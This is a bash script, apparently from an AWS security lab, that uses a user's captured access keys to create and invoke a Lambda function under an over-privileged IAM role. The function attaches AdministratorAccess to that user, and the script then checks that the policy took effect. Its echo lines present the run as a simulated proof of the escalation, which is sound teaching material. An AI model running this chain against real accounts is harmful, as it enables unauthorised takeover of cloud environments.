#!/bin/bash

set -x

usage="
		Creates and runs the lambda function that gives marketing-dave Administrator Access,
		by getting and using the discovered-role-with-iam-privs role with dave's credentials.
"

if [ x$1 != x ]; then
    if [ $1 == "help" ] || [ $1 == "--help" ]; then
      echo "${usage}"
      exit 0
	fi
fi

source env.sh

echo "$usage"

echo "Here is where we simulate discovering marketing-dave's creds. We put them in environment varibles."
echo "All calls from the rest of this script use  marketing-dave's credentials."
echo "Now we prove the privilege escalation possibility."
export AWS_ACCESS_KEY_ID=`cat keys.json | jq -r '.AccessKey.AccessKeyId'`
export AWS_SECRET_ACCESS_KEY=`cat keys.json | jq -r '.AccessKey.SecretAccessKey'`

echo "In real life, the attacker would need to run ScoutSuite or manually list and review role permissions"
echo "to find a suitable role. We skip over that and assume $DISCOVERED_ROLE_NAME was found."
echo "Get role arn from the role name needed for the creation of the lambda function"
role_arn=`aws iam get-role --role-name ${DISCOVERED_ROLE_NAME} | jq -r '.Role.Arn'`

echo "Create the lambda function, using the kingme.zip file, which contains the kingme.py script and the env.sh file"
aws lambda create-function \
    --function-name kingme-$RAND \
    --runtime python3.8 \
    --environment Variables={USER_NAME=$USER_NAME} \
    --zip-file fileb://kingme.zip \
    --handler kingme.handler \
    --role $role_arn

echo "Call the function, which grants marketing-dave the AdministratorAccess policy"
aws lambda invoke --function-name kingme-$RAND kingme.out --log-type Tail --query 'LogResult' --output text |  base64 -d

#Sleep 5 seconds to let the function take effect in AWS
sleep 5

echo "Check that everything ran accordingly by listing the attached AdministratorAccess policy"
aws iam list-attached-user-policies --user-name ${USER_NAME}
result=`aws iam list-attached-user-policies --user-name $USER_NAME | jq '.AttachedPolicies[0].PolicyName'`
for i in {1..5}
do
  if [ $result != '"AdministratorAccess"' ]; then
    sleep 10
    result=`aws iam list-attached-user-policies --user-name $USER_NAME | jq '.AttachedPolicies[0].PolicyName'`
  else
    break
  fi
  
done

